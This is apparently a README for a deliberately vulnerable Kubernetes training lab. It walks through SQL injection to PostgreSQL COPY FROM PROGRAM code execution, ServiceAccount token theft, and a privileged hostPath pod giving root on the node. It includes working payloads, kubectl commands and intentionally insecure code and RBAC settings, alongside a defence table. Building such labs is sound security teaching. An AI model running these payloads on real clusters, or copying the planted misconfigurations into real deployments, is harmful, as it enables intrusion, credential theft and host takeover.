# Lateral Movement Lab: SQL Injection → Postgres Pod → Root on the Kubernetes Server

A **deliberately vulnerable**, single-server Kubernetes lab that demonstrates a
full attack chain:

```
  Web app SQL injection
        │  (PostgreSQL COPY ... FROM PROGRAM — DB user is a superuser)
        ▼
  Remote code execution INSIDE the PostgreSQL pod
        │  (pod's ServiceAccount token is bound to cluster-admin)
        ▼
  cluster-admin on the Kubernetes API
        │  (schedule a privileged pod that mounts the host's / filesystem)
        ▼
  ROOT on the k3s node  ===  root on the server itself
```

> ⚠️ **For authorized security training only.** Everything here is intentionally
> insecure. Run it on a throwaway VM you own. Never expose it to a network you do
> not fully control, and tear it down when you are finished.

Yes — this runs end to end on **one server**. k3s runs the Kubernetes control
plane as ordinary host processes, so a pod that escapes onto the node *is* root
on the machine. That is what makes the single-box story clean and convincing.

---

## Requirements

- A disposable Linux VM you control (≈2 vCPU / 4 GB RAM is enough; 8 GB is comfy).
- `docker` (or `nerdctl`) to build the app image.
- `curl` and `python3` on the box (used by the attack script).
- Ability to run `sudo` (k3s install + image import).

## Quick start

```bash
cd k8s-lab/scripts

./setup-k3s.sh          # 1. install single-node k3s
./build-and-import.sh   # 2. build the vulnerable app image, import into k3s
./deploy.sh             # 3. deploy postgres + redis + app into namespace vuln-lab
./attack-demo.sh        # 4. run the full SQLi -> pod -> node root chain
./teardown.sh           # 5. clean up (add --uninstall-k3s to remove k3s too)
```

If your shell only has `k3s kubectl` (not a standalone `kubectl`), run the lab
scripts with `KUBECTL='sudo k3s kubectl'` set, e.g.
`KUBECTL='sudo k3s kubectl' ./deploy.sh`, or add
`alias kubectl='sudo k3s kubectl'`.

The app is published on `NodePort 30080`:

- Swagger UI: `http://<server-ip>:30080/swagger-ui.html`
- Vulnerable sink: `http://<server-ip>:30080/api/v1/lab/products?search=...`

---

## The three hops in detail

### Hop 1 — SQL injection → RCE in the Postgres pod

The sink is `com.owaspdemo.a05_injection.LabRceController` (active only under the
`k8slab` Spring profile). It concatenates user input straight into SQL and runs
it over a raw JDBC statement that allows **stacked queries**:

```java
String sql = "SELECT name, description, price FROM product WHERE name LIKE '%" + search + "%'";
stmt.execute(sql);   // multiple ';'-separated statements run
```

Because the app authenticates to PostgreSQL as a **superuser** (`owasp`, created
as superuser by the official postgres image), the attacker can use
`COPY ... FROM PROGRAM`, which runs a shell command **on the database server —
i.e. inside the Postgres pod** — and loads its output into a table the attacker
then reads back:

```sql
'; DROP TABLE IF EXISTS lab_out;
   CREATE TABLE lab_out(line text);
   COPY lab_out FROM PROGRAM 'id';
   SELECT line FROM lab_out; --
```

Over HTTP (URL-encoded), reading `id`:

```bash
curl -s --get http://<server-ip>:30080/api/v1/lab/products \
  --data-urlencode "search='; DROP TABLE IF EXISTS lab_out; CREATE TABLE lab_out(line text); COPY lab_out FROM PROGRAM 'id'; SELECT line FROM lab_out; -- "
```

### Hop 2 — Steal the ServiceAccount token → cluster-admin

Kubernetes mounts the pod's ServiceAccount token at
`/var/run/secrets/kubernetes.io/serviceaccount/token`. The same RCE primitive
reads it:

```sql
COPY lab_out FROM PROGRAM 'cat /var/run/secrets/kubernetes.io/serviceaccount/token';
```

In this lab the Postgres pod's ServiceAccount (`postgres-sa`) is bound to the
built-in **`cluster-admin`** ClusterRole (`10-postgres-rbac.yaml`). So the stolen
token is a master key to the cluster API:

```bash
kubectl --server https://127.0.0.1:6443 --token "$STOLEN" --insecure-skip-tls-verify \
  auth can-i '*' '*' --all-namespaces      # -> yes
```

### Hop 3 — cluster-admin → root on the node

With cluster-admin, the attacker schedules a **privileged** pod that mounts the
node's root filesystem (`hostPath: /`) and `chroot`s into it:

```yaml
spec:
  nodeName: <node>
  containers:
    - name: shell
      image: postgres:16-alpine
      securityContext: { privileged: true }
      volumeMounts: [{ name: host, mountPath: /host }]
  volumes:
    - name: host
      hostPath: { path: / }
```

```bash
kubectl ... exec node-pwn -- chroot /host id          # uid=0(root) on the NODE
kubectl ... exec node-pwn -- chroot /host cat /etc/shadow
```

On k3s that node is this server, so this is root on the host. `attack-demo.sh`
finishes by writing a proof marker to the host's real `/tmp` and reading it back
from outside any container.

---

## How to defend against each hop

This is the part that makes it a *teaching* lab — every hop has a concrete fix:

| Hop | Root cause | Fix |
|-----|-----------|-----|
| 1 (SQLi) | String-concatenated SQL | Parameterized queries / prepared statements (`?` bind params); never build SQL from input. |
| 1 (SQLi→RCE) | App connects as a DB **superuser** | Use a least-privilege role that owns only the app tables; revoke `pg_execute_server_program`; no superuser. |
| 2 (token theft) | Over-privileged SA bound to `cluster-admin` | Dedicated SA per workload with minimal RBAC; set `automountServiceAccountToken: false` unless the pod truly needs the API. |
| 3 (node takeover) | Privileged + `hostPath: /` pods allowed | Enforce Pod Security Admission `restricted`; forbid `privileged`, `hostPath`, `hostPID/hostNetwork`; run as non-root with read-only root FS; add NetworkPolicies and admission policy (Kyverno/Gatekeeper). |

Defense in depth: any **one** of these fixes breaks the chain. Fixing the SQLi
stops it at the front door; dropping the superuser stops RCE even if SQLi slips
through; least-privilege RBAC stops the pivot even after a pod shell; Pod Security
Admission stops the node takeover even with a stolen cluster-admin token.

---

## File map

```
k8s-lab/
├── README.md                         # this walkthrough
├── manifests/
│   ├── 00-namespace.yaml             # vuln-lab namespace
│   ├── 10-postgres-rbac.yaml         # MISCONFIG: postgres SA -> cluster-admin (hop 2->3)
│   ├── 20-postgres.yaml              # MISCONFIG: DB user is superuser (hop 1 RCE)
│   ├── 30-redis.yaml                 # supporting dependency (not part of the chain)
│   └── 40-app.yaml                   # the vulnerable Spring Boot app (NodePort 30080)
└── scripts/
    ├── setup-k3s.sh                  # install single-node k3s
    ├── build-and-import.sh           # build app image + import into k3s
    ├── deploy.sh                     # apply manifests, wait for rollout
    ├── attack-demo.sh                # automated end-to-end PoC (all 3 hops)
    └── teardown.sh                   # clean up (optionally uninstall k3s)
```

The app-side sink lives in the main source tree so it is baked into the image:
- `src/main/java/com/owaspdemo/a05_injection/LabRceController.java`
- `src/main/resources/application-k8slab.yml`
